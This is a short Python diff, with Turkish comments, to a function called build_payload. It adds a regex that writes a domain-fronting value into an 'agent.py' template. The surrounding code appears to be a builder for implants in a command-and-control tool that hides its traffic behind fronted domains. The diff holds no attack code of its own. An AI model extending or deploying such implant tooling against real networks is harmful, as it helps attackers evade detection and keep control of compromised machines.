@@ -317,6 +317,14 @@ def build_payload(
         'FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"',
         f'FRONTING_DOMAIN = "{fronting_domain}"',
     )
+    # agent.py çok satırlı FRONTING_DOMAIN tanımını da destekle
+    agent_code = re.sub(
+        r'FRONTING_DOMAIN = \(\s*\n\s*"{{FRONTING_DOMAIN}}".*?\n\s*\)',
+        f'FRONTING_DOMAIN = "{fronting_domain}"',
+        agent_code,
+        count=1,
+        flags=re.DOTALL,
+    )
 
     # --- Yorum satırlarını kaldır (opsiyonel) ---
     if strip_comments:
